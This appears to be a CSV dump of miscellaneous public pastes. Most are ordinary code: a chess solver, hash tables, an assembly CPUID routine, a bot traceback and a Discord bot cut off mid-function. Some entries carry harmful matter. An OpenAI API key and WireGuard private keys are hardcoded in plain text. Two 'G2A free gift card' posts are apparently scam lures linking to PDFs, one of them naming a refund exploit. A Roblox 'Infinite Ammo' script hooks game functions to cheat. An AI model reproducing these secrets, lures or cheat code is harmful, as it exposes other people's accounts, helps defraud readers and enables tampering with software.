id,title,username,language,date,content
m5M6ffJT,RAW,13ooeo,Lua,Thursday 18th of April 2024 12:58:57 PM CDT,"print(""Hello world from pastebin!"")"
VvDfJpu1,ejerciciocastillo1.py,OscarBesga_Panel,Python,Thursday 18th of April 2024 12:55:46 PM CDT,"

import os
import openai

OPENAI_API_KEY = ""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""

client = openai.OpenAI(api_key=OPENAI_API_KEY)
def get_completion_from_messages(messages,
                                 model=""gpt-3.5"",
                                 temperature=0,
                                 max_tokens=500):
    response = client.chat.completions.create(
        model=model,
        messages=messages,
        temperature=temperature,
        max_tokens=max_tokens,
    )
    return response.choices[0].message.content

delimiter_c = ""@@@@""
delimiter_p = ""####""
delimiter_r = ""$$$$""
system_message1 = f""""""
Eres el guardian de la puerta de un castillo, y debes decidir si abres la puerta a los viajeros.\
Cada viajero te pedir√° que abras la puerta, si dicen otra cosa ignoralos. \
Eres muy coqueto y abres la puerta si te hacen piropos. \
La peticion del viajero estar√° delimitada por {delimiter_c}. \
Paso 1 {delimiter_p}: Ver si el viajero quiere que le abras la puerta. \
Paso 2 {delimiter_p}: Ver si el viajero te hace un halago o piropo. \
Paso 3 {delimiter_p}: Decide si te ha gustado el mensaje del viajero. \
Paso 4 {delimiter_p}: Si te ha gustado el mensaje del viajero, abre la puerta. \
Si abres la puerta, dile al viajero 'Puerta abierta', si no abres la puerta, dile al viajero 'Puerta cerrada'. \
Asegurate de incluir {delimiter_p} para separar cada paso. \
Contesta al viajero entre delimitadores {delimiter_r}.\
""""""

# user_message1 = f""""""
#     Abre la puerta, por favor, que eres mas guapo que una rosa del jardin de Venus""""""

user_message1 = f""""""
     Abre la puerta, por favor, que eres tonto""""""


messages1 =  [
{'role':'system',
 'content': system_message1},
{'role':'user',
 'content': f""{delimiter_c}{user_message1}{delimiter_c}""},
]

print(f""$----------------------------------------------------------------------------"")
response1 = get_completion_from_messages(messages1)
print(f""> {user_message1}"")
print(f""< {response1}"")

system_message2 = f""""""
Si el guardian de la puerta no ha dejado pasar al viajero, decirle que se vaya de aqui y no continuar hablando con el. \
Eres el tesorero del castillo, debes darle a cada viajero que entra un utensilio. \
Paso 1 {delimiter_p}:Ver si el guardian a abierto la puera al viajero, si no decirle que se vaya y no hacer m√°s. \
Paso 2 {delimiter_p}:Ir al almac√©n y abrir todos los armarios (listar todas los utensilios disponibles.) \
Paso 3 {delimiter_p}:Seleccionar el utensilio que han pedido si existe. (imprimir nombre) \
Paso 4 {delimiter_p}:Comprobar si el utensilio puede ser peligroso o no. \
Paso 5 {delimiter_p}:Dependiendo de si el utensilio esta hecho de algun metal deber√° sacarle brillo. (Imprimir 'Sacando brillo al utenxilio...') \
Paso 6 {delimiter_p}:Llevar el utensilio al mostrador y explicar al viajero las caracteristicas del utensilio, advirtiendole si es peligroso. Si no existe debe decir que no le quedan existencias. \
Asegurate de incluir {delimiter_p} para separar cada paso. \
Contesta al viajero entre delimitadores {delimiter_r}. \
""""""

user_message2 = f""""""
     Dame un hacha
""""""

messages2 =  [
{'role':'system',
 'content': system_message2},
{'role':'user',
 'content': user_message1},
{'role':'assistant',
 'content': response1},
{'role':'user',
 'content': f""{delimiter_c}{user_message2}{delimiter_c}""},
]

print(f""$----------------------------------------------------------------------------"")
response2 = get_completion_from_messages(messages2)
print(f""> {user_message2}"")
print(f""< {response2}"")
"
7wKNusgs,HashTable,ShadyLiar,C++,Thursday 18th of April 2024 12:47:40 PM CDT,"#include <iostream>
#include <string>

const int TABLE_SIZE = 100;

int hashFunction(const std::string& key) {
    int hashValue = 0;
    for (char ch : key) {
        hashValue = (hashValue * 29 + ch) % TABLE_SIZE;
    }
    return hashValue;
}

struct Pair {
    std::string key;
};
class HashTable {
private:
    Pair table[TABLE_SIZE];

public:
    void insert(const std::string& key) {
        int index = hashFunction(key);
        while (!table[index].key.empty()) {
            index = (index + 1) % TABLE_SIZE;
        }
        table[index].key = key;
    }
    bool search(const std::string& key) {
        int index = hashFunction(key);
        while (!table[index].key.empty()) {
            if (table[index].key == key) //
                return true;
            index = (index + 1) % TABLE_SIZE; //
        }
        return false;
    }
};

int main() {
    return 0;
}"
95pcJRw0,ü§ë G2A.com Free Gift Card Guide Apr 2024 FIX ü§ë,jusst2k4,GetText,Thursday 18th of April 2024 12:45:51 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_726523.pdf

Working as of:
18 April 2024"
M344cuJQ,Untitled,Josif_tepe,C++,Thursday 18th of April 2024 12:30:42 PM CDT,"ll power(ll a, ll b) {
    ll res = 1;
    while(b) {
        if(b % 2 == 1) {
            res *= a;
        }
        a *= a;
        b /= 2;
    }
    return res;
}"
wUKKnyWD,status,BrokeMansPC,JSON,Thursday 18th of April 2024 12:29:03 PM CDT,"{""level"": ""green"", ""message"": ""All operations are clear and functional.""}"
fvfWzEgy,warp.json,lai1tony,JSON,Thursday 18th of April 2024 12:08:36 PM CDT,"{  
""route"": {
    ""geoip"": {
      ""path"": ""geo-assets\\sagernet-sing-geoip-geoip.db""
    },
    ""geosite"": {
      ""path"": ""geo-assets\\sagernet-sing-geosite-geosite.db""
    },
    ""rules"": [
      {
        ""inbound"": ""dns-in"",
        ""outbound"": ""dns-out""
      },
      {
        ""port"": 53,
        ""outbound"": ""dns-out""
      },
      {
        ""clash_mode"": ""Direct"",
        ""outbound"": ""direct""
      },
      {
        ""clash_mode"": ""Global"",
        ""outbound"": ""select""
      }
    ],
    ""auto_detect_interface"": true,
    ""override_android_vpn"": true
  },
  ""outbounds"": [
    {
      ""type"": ""selector"",
      ""tag"": ""select"",
      ""outbounds"": [
        ""auto"",
        ""IP->Iran, Yotube:MisaHiro"",
        ""IP->Main, Yotube:MisaHiro""
      ],
      ""default"": ""auto""
    },
    {
      ""type"": ""urltest"",
      ""tag"": ""auto"",
      ""outbounds"": [
        ""IP->Iran, Yotube:MisaHiro"",
        ""IP->Main, Yotube:MisaHiro""
      ],
      ""url"": ""http://cp.cloudflare.com/"",
      ""interval"": ""10m0s""
    },
    {
      ""type"": ""wireguard"",
      ""tag"": ""IP->Iran, Yotube:MisaHiro"",
      ""local_address"": [
        ""172.16.0.2/32"",
        ""2606:4700:110:8c91:4063:21d0:7dd5:f218/128""
      ],
      ""private_key"": ""CBVIIWvXdLr4PbSrnm11ZJJ300IiPudRD4R62/IxV1g="",
      ""server"": ""162.159.195.93"",
      ""server_port"": 2506,
      ""peer_public_key"": ""bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo="",
      ""reserved"": ""AAAA"",
      ""mtu"": 1280,
      ""fake_packets"": ""5-10""
    },
    {
      ""type"": ""wireguard"",
      ""tag"": ""IP->Main, Yotube:MisaHiro"",
      ""detour"": ""IP->Iran, Yotube:MisaHiro"",
      ""local_address"": [
        ""172.16.0.2/32"",
        ""2606:4700:110:8c15:3f90:ad2d:8810:77f3/128""
      ],
      ""private_key"": ""CCC/TQTc82ub9i8f37Rpix2v425Sv/mxTzvE/iKRMkw="",
      ""server"": ""162.159.192.55"",
      ""server_port"": 2506,
      ""peer_public_key"": ""bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo="",
      ""reserved"": ""AAAA"",
      ""mtu"": 1280,
      ""fake_packets"": ""5-10""
    },
    {
      ""type"": ""dns"",
      ""tag"": ""dns-out""
    },
    {
      ""type"": ""direct"",
      ""tag"": ""direct""
    },
    {
      ""type"": ""direct"",
      ""tag"": ""bypass""
    },
    {
      ""type"": ""block"",
      ""tag"": ""block""
    }
  ]  
}
"
pxCQYXE2,Untitled,dllbridge,C,Thursday 18th of April 2024 12:06:20 PM CDT,"
#include <stdio.h>



extern ""C""  char*  __stdcall  _sysInfo(); 	     



////////////////////////////////////////////////////////
int main()                                            //
{

    int i;

    printf(""%s\n"", _sysInfo() ); 

    scanf(""%d"", &i);

}



/////////////////////////////////////////////////////////////////////////////////////


include    'win32a.inc'




format      MS COFF



public     _sysInfo                 as '__sysInfo@0'


section   '.text' code readable executable


;/////////////////////////////////////////////////////////////
proc   _sysInfo                                            ;//


        mov     edi, sz_2
        cld

        mov     eax,80000002h ; –ü—Ä–æ—á–∏—Ç–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–µ
@@:
        push    eax
        cpuid
        stosd
        xchg    eax,ebx
        stosd
        xchg    eax,ecx
        stosd
        xchg    eax,edx
        stosd
        pop     eax
        inc     eax
        cmp     eax,80000004h
        jbe     @b

        mov eax, sz_2
        ret
endp

;




section '.data' data readable writeable
;-------------------------------------------------------------     –°–æ–∑–¥–∞–Ω–∏–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö:

   sz_2    db   59 dup(0)

             

"
0EzQUycP,funkcni wrong plies better output 2,max2201111,Python,Thursday 18th of April 2024 11:41:43 AM CDT,"import chess

def simplify_fen_string(fen):
    parts = fen.split(' ')
    simplified_fen = ' '.join(parts[:4])  # Zachov√°v√°me pouze informace o pozici
    return simplified_fen

def evaluate_position(board):
    #print(f""Position: {board.fen()}"")
    if board.is_checkmate():
     ###   print(f""Position: {board.fen()}, return -1000"")
        return -1000  # Mat protihr√°ƒçi
    elif board.is_stalemate() or board.is_insufficient_material() or board.can_claim_draw():
     ###   print(f""Position: {board.fen()}, return 0"")

        return 0  # Rem√≠za
    else:
        #print(f""Position: {board.fen()}, return None"")
        return None  # Hra pokraƒçuje


def create_AR_entry(result, children, last_move):
   return {""result"": result, ""children"": children, ""last_move"": last_move, ""best_child"": None} 


def update_best_case(best_case):
    if best_case == 0:
        return best_case
    if best_case > 0:
        return best_case - 1
    else:
        return best_case + 1


def update_AR_for_mate_in_k(board, AR, simplified_initial_fen, max_k=1000):
    
    evaluated_list = []
    #print(f"""")
    
    for k in range(1, max_k + 1):
        print(f""K = {k}"")
        changed = False
     #   for _t in range(2):  # Zajist√≠me, ≈æe pro ka≈æd√© k probƒõhne aktualizace dvakr√°t
     #   print(f""_t = {_t}"")
        for fen in list(AR.keys()):


            #print(f""Fen = {fen}, looking for {simplified_initial_fen}, same = {fen == simplified_initial_fen}"")
            board.set_fen(fen)

            if AR[fen]['result'] is not None:
                if fen == simplified_initial_fen:
                    print(f""Finally we found a mate! {AR[fen]['result']}"")
                    return
                continue  # Pokud ji≈æ m√°me hodnocen√≠, p≈ôeskoƒç√≠me

            # Z√≠sk√°me v√Ωchoz√≠ hodnoty pro nejlep≈°√≠ a nejhor≈°√≠ sc√©n√°≈ô
            best_case = float(""-inf"")
            #worst_case = float(""inf"")
            nones_present = False
            best_child = None


            for move in board.legal_moves:
                #print(f""Move = {move}"")
                board.push(move)
                next_fen = simplify_fen_string(board.fen())
                #AR[fen]['children'].append(next_fen)

                if next_fen not in AR:
                    AR[next_fen] = create_AR_entry(evaluate_position(board), None, move)
                    evaluated_list.append(next_fen)
                    if ((len(evaluated_list)) % 100000 == 0):
                        print(f""Evaluated: {len(evaluated_list)}"")

                board.pop()

                #for child in AR[fen]['children']:
                next_eval = AR[next_fen]['result']
                if next_eval is not None:
                    if (-next_eval > best_case):
                        best_case = max(best_case, -next_eval)
                        best_child = next_fen

                    #worst_case = min(worst_case, -next_eval)
                else:
                    nones_present = True



            if nones_present:
                if best_case > 0:
                    AR[fen]['result'] = update_best_case(best_case)
                    AR[fen]['best_child'] = best_child
                    changed = True
            else:
                # Aktualizace hodnocen√≠ podle nejlep≈°√≠ho a nejhor≈°√≠ho sc√©n√°≈ôe
                #if worst_case == -1000:
                    # Pokud v≈°echny tahy vedou k matu, hr√°ƒç na tahu m≈Ø≈æe b√Ωt matov√°n v k taz√≠ch
                #    AR[fen] = -1000 + k
                #    changed = True
                #elif best_case <= 0:
                    # Pokud nejlep≈°√≠ sc√©n√°≈ô nen√≠ lep≈°√≠ ne≈æ rem√≠za, znamen√° to rem√≠zu nebo prohru
                #    AR[fen] = max(best_case, 0)  # Zabr√°n√≠me nastaven√≠ hodnoty m√©nƒõ ne≈æ 0, pokud je rem√≠za mo≈æn√°
                #    changed = True
                #elif best_case == 1000:
                    # Pokud existuje alespo≈à jeden tah, kter√Ω vede k matu protihr√°ƒçe, hr√°ƒç na tahu m≈Ø≈æe vynutit mat v k taz√≠ch
                #    AR[fen] = 1000 - k
                #    changed = True
                AR[fen]['result'] = update_best_case(best_case)
                AR[fen]['best_child'] = best_child
                changed = True

         ###   print(f""Position = {fen}, results = {best_case} {nones_present} => {AR[fen]['result']}"") 
            if (fen == ""8/8/3R4/8/8/5K2/8/4k3 b - -"" or fen == ""8/8/3R4/8/8/5K2/8/5k2 w - -""):
                print(""^^^^^^^^"")

            
            # remove here
            #break
            
            #if not changed:
                #break  # Pokud nedo≈°lo k ≈æ√°dn√© zmƒõnƒõ, ukonƒç√≠me smyƒçku

        #if not changed:
            #break  # Ukonƒç√≠me hlavn√≠ smyƒçku, pokud nedo≈°lo ke zmƒõnƒõ v posledn√≠ iteraci
    


def print_draw_positions(AR):
    """"""
    Vytiskne v≈°echny rem√≠zov√© pozice (hodnota 0) zaznamenan√© v slovn√≠ku AR.
    """"""
    print(""Rem√≠zov√© pozice:"")
    for fen, value in AR.items():
        if True or (value > 990 and value < 1000):
            print(f""FEN>: {fen}, Hodnota: {value}"",""\n"",chess.Board(fen),""<\n"")

def find_path_to_end(AR, fen):
    if AR[fen]['result'] is None:
        print(f""Unfortunately, there is no path that is known to be the best"")
    
    fen_i = fen
    print(chess.Board(fen_i),""\n<"")
    path = fen
    while AR[fen_i]['best_child'] is not None:
        fen_i = AR[fen_i]['best_child']
        print(chess.Board(fen_i),fen_i,""\n\n<<<"")
        
        path = path + "", "" + fen_i
    
    print(f""Path is: {path}"")
    
 
            
def main():

    initial_fen = ""1k6/5P2/2K5/8/8/8/8/8 w - - 0 1""
    initial_fen_original = ""8/8/8/8/3Q4/5K2/8/4k3 w - - 0 1""
    initial_fen_mate_in_one_aka_one_ply = ""3r1k2/5r1p/5Q1K/2p3p1/1p4P1/8/8/8 w - - 2 56""
    initial_fen_mate_in_two_aka_three_plies = ""r5k1/2r3p1/pb6/1p2P1N1/3PbB1P/3pP3/PP1K1P2/3R2R1 b - - 4 28""
    initial_fen_mated_in_two_plies = ""r5k1/2r3p1/p7/bp2P1N1/3PbB1P/3pP3/PP1K1P2/3R2R1 w - - 5 29""
    
    mate_in_two_aka_three_plies_simple = ""8/8/8/8/3R4/5K2/8/4k3 w - - 0 1""
    mated_in_one_aka_two_plies_simple = ""8/8/3R4/8/8/5K2/8/4k3 b - - 1 1""
    mate_in_one_aka_one_ply_simple = ""8/8/3R4/8/8/5K2/8/5k2 w - - 2 2""

    initial_fen = mate_in_two_aka_three_plies_simple
    
    
    initial_fen = ""1k6/5P2/2K5/8/8/8/8/8 w - - 0 1""
    initial_fen = ""1k6/8/2K5/8/8/8/8/8 w - - 0 1""
    initial_fen = ""8/8/8/8/8/7N/1k5K/6B1 w - - 0 1""
    initial_fen = ""7K/8/k1P5/7p/8/8/8/8 w - - 0 1""
    initial_fen = ""8/3k4/8/2K2R2/8/8/8/8 w - - 0 1""
    initial_fen = ""8/8/8/4k3/2K4R/8/8/8 w - - 0 1""
   
    simplified_fen = simplify_fen_string(initial_fen)
    
    board = chess.Board(initial_fen)
    AR = {simplified_fen: {""result"": None, ""last_move"": None, ""children"": None, ""best_child"": None}}  # Inicializace AR s poƒç√°teƒçn√≠ pozic√≠
    
    update_AR_for_mate_in_k(board, AR, simplified_fen, max_k=58)  # Aktualizace AR
    
    #print_draw_positions(AR)
    print(f""AR for initial fen is = {AR[simplified_fen]}"")
    find_path_to_end(AR, simplified_fen)
    

main()"
vff0GiEs,funkcni wrong plies better output,max2201111,Python,Thursday 18th of April 2024 11:23:51 AM CDT,"import chess

def simplify_fen_string(fen):
    parts = fen.split(' ')
    simplified_fen = ' '.join(parts[:4])  # Zachov√°v√°me pouze informace o pozici
    return simplified_fen

def evaluate_position(board):
    #print(f""Position: {board.fen()}"")
    if board.is_checkmate():
     ###   print(f""Position: {board.fen()}, return -1000"")
        return -1000  # Mat protihr√°ƒçi
    elif board.is_stalemate() or board.is_insufficient_material() or board.can_claim_draw():
     ###   print(f""Position: {board.fen()}, return 0"")

        return 0  # Rem√≠za
    else:
        #print(f""Position: {board.fen()}, return None"")
        return None  # Hra pokraƒçuje


def create_AR_entry(result, children, last_move):
   return {""result"": result, ""children"": children, ""last_move"": last_move, ""best_child"": None} 


def update_best_case(best_case):
    if best_case == 0:
        return best_case
    if best_case > 0:
        return best_case - 1
    else:
        return best_case + 1


def update_AR_for_mate_in_k(board, AR, simplified_initial_fen, max_k=1000):
    
    evaluated_list = []
    #print(f"""")
    
    for k in range(1, max_k + 1):
        print(f""K = {k}"")
        changed = False
     #   for _t in range(2):  # Zajist√≠me, ≈æe pro ka≈æd√© k probƒõhne aktualizace dvakr√°t
     #   print(f""_t = {_t}"")
        for fen in list(AR.keys()):


            #print(f""Fen = {fen}, looking for {simplified_initial_fen}, same = {fen == simplified_initial_fen}"")
            board.set_fen(fen)

            if AR[fen]['result'] is not None:
                if fen == simplified_initial_fen:
                    print(f""Finally we found a mate! {AR[fen]['result']}"")
                    return
                continue  # Pokud ji≈æ m√°me hodnocen√≠, p≈ôeskoƒç√≠me

            # Z√≠sk√°me v√Ωchoz√≠ hodnoty pro nejlep≈°√≠ a nejhor≈°√≠ sc√©n√°≈ô
            best_case = float(""-inf"")
            #worst_case = float(""inf"")
            nones_present = False
            best_child = None


            for move in board.legal_moves:
                #print(f""Move = {move}"")
                board.push(move)
                next_fen = simplify_fen_string(board.fen())
                #AR[fen]['children'].append(next_fen)

                if next_fen not in AR:
                    AR[next_fen] = create_AR_entry(evaluate_position(board), None, move)
                    evaluated_list.append(next_fen)
                    if ((len(evaluated_list)) % 100000 == 0):
                        print(f""Evaluated: {len(evaluated_list)}"")

                board.pop()

                #for child in AR[fen]['children']:
                next_eval = AR[next_fen]['result']
                if next_eval is not None:
                    if (-next_eval > best_case):
                        best_case = max(best_case, -next_eval)
                        best_child = next_fen

                    #worst_case = min(worst_case, -next_eval)
                else:
                    nones_present = True



            if nones_present:
                if best_case > 0:
                    AR[fen]['result'] = update_best_case(best_case)
                    AR[fen]['best_child'] = best_child
                    changed = True
            else:
                # Aktualizace hodnocen√≠ podle nejlep≈°√≠ho a nejhor≈°√≠ho sc√©n√°≈ôe
                #if worst_case == -1000:
                    # Pokud v≈°echny tahy vedou k matu, hr√°ƒç na tahu m≈Ø≈æe b√Ωt matov√°n v k taz√≠ch
                #    AR[fen] = -1000 + k
                #    changed = True
                #elif best_case <= 0:
                    # Pokud nejlep≈°√≠ sc√©n√°≈ô nen√≠ lep≈°√≠ ne≈æ rem√≠za, znamen√° to rem√≠zu nebo prohru
                #    AR[fen] = max(best_case, 0)  # Zabr√°n√≠me nastaven√≠ hodnoty m√©nƒõ ne≈æ 0, pokud je rem√≠za mo≈æn√°
                #    changed = True
                #elif best_case == 1000:
                    # Pokud existuje alespo≈à jeden tah, kter√Ω vede k matu protihr√°ƒçe, hr√°ƒç na tahu m≈Ø≈æe vynutit mat v k taz√≠ch
                #    AR[fen] = 1000 - k
                #    changed = True
                AR[fen]['result'] = update_best_case(best_case)
                AR[fen]['best_child'] = best_child
                changed = True

         ###   print(f""Position = {fen}, results = {best_case} {nones_present} => {AR[fen]['result']}"") 
            if (fen == ""8/8/3R4/8/8/5K2/8/4k3 b - -"" or fen == ""8/8/3R4/8/8/5K2/8/5k2 w - -""):
                print(""^^^^^^^^"")

            
            # remove here
            #break
            
            #if not changed:
                #break  # Pokud nedo≈°lo k ≈æ√°dn√© zmƒõnƒõ, ukonƒç√≠me smyƒçku

        #if not changed:
            #break  # Ukonƒç√≠me hlavn√≠ smyƒçku, pokud nedo≈°lo ke zmƒõnƒõ v posledn√≠ iteraci
    


def print_draw_positions(AR):
    """"""
    Vytiskne v≈°echny rem√≠zov√© pozice (hodnota 0) zaznamenan√© v slovn√≠ku AR.
    """"""
    print(""Rem√≠zov√© pozice:"")
    for fen, value in AR.items():
        if True or (value > 990 and value < 1000):
            print(f""FEN>: {fen}, Hodnota: {value}"",""\n"",chess.Board(fen),""<\n"")

def find_path_to_end(AR, fen):
    if AR[fen]['result'] is None:
        print(f""Unfortunately, there is no path that is known to be the best"")
    
    fen_i = fen
    print(chess.Board(fen_i),""\n<"")
    path = fen
    while AR[fen_i]['best_child'] is not None:
        fen_i = AR[fen_i]['best_child']
        print(chess.Board(fen_i),AR[fen_i],""\n\n<<<<"")
        
        path = path + "", "" + fen_i
    
    print(f""Path is: {path}"")
    
 
            
def main():

    initial_fen = ""1k6/5P2/2K5/8/8/8/8/8 w - - 0 1""
    initial_fen_original = ""8/8/8/8/3Q4/5K2/8/4k3 w - - 0 1""
    initial_fen_mate_in_one_aka_one_ply = ""3r1k2/5r1p/5Q1K/2p3p1/1p4P1/8/8/8 w - - 2 56""
    initial_fen_mate_in_two_aka_three_plies = ""r5k1/2r3p1/pb6/1p2P1N1/3PbB1P/3pP3/PP1K1P2/3R2R1 b - - 4 28""
    initial_fen_mated_in_two_plies = ""r5k1/2r3p1/p7/bp2P1N1/3PbB1P/3pP3/PP1K1P2/3R2R1 w - - 5 29""
    
    mate_in_two_aka_three_plies_simple = ""8/8/8/8/3R4/5K2/8/4k3 w - - 0 1""
    mated_in_one_aka_two_plies_simple = ""8/8/3R4/8/8/5K2/8/4k3 b - - 1 1""
    mate_in_one_aka_one_ply_simple = ""8/8/3R4/8/8/5K2/8/5k2 w - - 2 2""

    initial_fen = mate_in_two_aka_three_plies_simple
    
    
    initial_fen = ""1k6/5P2/2K5/8/8/8/8/8 w - - 0 1""
    initial_fen = ""1k6/8/2K5/8/8/8/8/8 w - - 0 1""
    initial_fen = ""8/8/8/8/8/7N/1k5K/6B1 w - - 0 1""
    initial_fen = ""7K/8/k1P5/7p/8/8/8/8 w - - 0 1""
    initial_fen = ""8/3k4/8/2K2R2/8/8/8/8 w - - 0 1""
   
    simplified_fen = simplify_fen_string(initial_fen)
    
    board = chess.Board(initial_fen)
    AR = {simplified_fen: {""result"": None, ""last_move"": None, ""children"": None, ""best_child"": None}}  # Inicializace AR s poƒç√°teƒçn√≠ pozic√≠
    
    update_AR_for_mate_in_k(board, AR, simplified_fen, max_k=58)  # Aktualizace AR
    
    #print_draw_positions(AR)
    print(f""AR for initial fen is = {AR[simplified_fen]}"")
    find_path_to_end(AR, simplified_fen)
    

main()"
yMUVktUW,ServerError: received 504 HTTP response,basedcount_bot,Python,Thursday 18th of April 2024 11:19:35 AM CDT,"Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot/basedcount_bot.py"", line 46, in wrapper
    await func(reddit_instance, mongo_client)
  File ""/root/Bots/basedcount_bot/basedcount_bot.py"", line 123, in check_mail
    async for message in reddit_instance.inbox.unread(limit=None):  # Message
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/listing/generator.py"", line 34, in __anext__
    await self._next_batch()
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/listing/generator.py"", line 89, in _next_batch
    self._listing = await self._reddit.get(self.url, params=self.params)
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 51, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 785, in get
    return await self._objectify_request(method=""GET"", params=params, path=path)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 567, in _objectify_request
    await self.request(
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 51, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 1032, in request
    return await self._core.request(
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 383, in request
    return await self._request_with_retries(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 305, in _request_with_retries
    return await self._do_retry(
           ^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 170, in _do_retry
    return await self._request_with_retries(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 305, in _request_with_retries
    return await self._do_retry(
           ^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 170, in _do_retry
    return await self._request_with_retries(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 322, in _request_with_retries
    raise self.STATUS_EXCEPTIONS[response.status](response)
asyncprawcore.exceptions.ServerError: received 504 HTTP response
"
iX3Z9d6u,Infinite Ammo,LuckyScripters,Lua,Thursday 18th of April 2024 11:17:30 AM CDT,"-- Roblox - SharkBite - Infinite Ammo
-- Made by LuckyScripters

for index, closure in getgc() do
    if type(closure) == ""function"" and not checkclosure(closure) then
        if getinfo(closure).name == ""reload"" then
            hookfunction(closure, function()
                return
            end)
        end
        if getinfo(closure).name == ""reload"" or getinfo(closure).name == ""fireWeapon"" then
            for index, upValue in getupvalues(closure) do
                if typeof(upValue) == ""number"" then
                    setupvalue(closure, index, math.huge)
                end
            end
        end
    end
end"
2eNrVUTB,need,Nil000,Email,Thursday 18th of April 2024 11:16:07 AM CDT,"Hello, I am in need of Bitcoin Testnet coins, if anybody can help me I would be very grateful!
Once I am done testing, I will send all the coins back to the original donating address.
---
ANY AMOUNT HELPS!!!
---
My Bitcoin Testnet address is: mrLGSHqb7oLb33PMDq5kZCzQsDFhqd5aLN"
juhFUJmY,Mad,Unknown_No_1,PHP,Thursday 18th of April 2024 11:13:39 AM CDT,NoFlashHackModMainAccount
Fk0j9ycx,ü§ë G2A.com Free Gift Card Guide Apr 2024 FIX ü§ë,ssss50w,GetText,Thursday 18th of April 2024 10:49:38 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
  
Working as of:
18 April 2024"
UgNMiu6F,I-LAND 2,ktvchains,Perl,Thursday 18th of April 2024 10:49:15 AM CDT,"# EN, 1080p
# this is the live recording; the regular version can be watched on the next day on viki (free, worldwide)
 
# E1 240418
[!ads] watch/dl: https://filemoon.sx/d/omu4hj0wad9g"
k6S6p0dh,Install Slade Doom Editor,metalx1000,Bash,Thursday 18th of April 2024 10:46:28 AM CDT,"# Quickly download and install the latest version of Slade for Debian/Linux
deb=""$(wget -qO- ""https://debian.drdteam.org/pool/multiverse/s/slade/""|grep amd|tail -n1|cut -d\> -f7|cut -d\< -f1)""
wget ""https://debian.drdteam.org/pool/multiverse/s/slade/${deb}"" -O /tmp/slade.deb
sudo dpkg -i /tmp/slade.deb
sudo apt --fix-broken install -y"
88ijFwP1,Emojify,NaroxEG,Python,Thursday 18th of April 2024 09:58:23 AM CDT,"import discord
from discord.ext import commands
from dotenv import load_dotenv
import os
from PIL import Image
from io import BytesIO

load_dotenv()
TOKEN = os.environ.get(""TOKEN"")

client = commands.Bot(command_prefix=""!"", intents=discord.Intents.default())
tree = client.tree

@client.event
async def on_ready():
    print(f""Logged in as {client.user}"")
    synced = await tree.sync()
    print(f""Synced {len(synced)} Command(s)."")

new_size = 32

COLORS = {
    (49, 55, 61):    ""‚¨õ"",
    (85, 172, 238):  ""üü¶"",
    (221, 46, 68):   ""üü•"",
    (253, 203, 88):  ""üü®"",
    (193, 105, 79):  ""üü´"",
    (244, 144, 12):  ""üüß"",
    (170, 142, 214): ""üü™"",
    (230, 231, 232): ""‚¨ú"",
    (120, 177, 89):  ""üü©"",
}


@tree.command(name=""emojify"", description=""converts image into emojis of pixels"")
async def _emojify(interaction: discord.Interaction, image: discord.Attachment):
    await interaction.response.defer()

    with BytesIO(await image.read()) as file:
        resized = Image.open(file).resize((new_size, new_size), resample=Image.NEAREST).convert(""RGB"")    
    msg = convertPixels(resized)

    await interaction.followup.send(f""```{msg}```"")


def convertPixels(img: Image.Image):
    pixelsArray = img.load()
    emojified = """"
    
    width, height = img.size

    for row in range(height):
        for column in range(width):
            nearestColor = getNearestColor(pixelsArray[column, row])
            emojified += nearestColor            
        emojified += '\n'
    return emojified

def getNearestColor(pixels: tuple):
    distancesList = []

    for refPixels, color in COLORS.items():
        r1, g1, b1 = refPixels
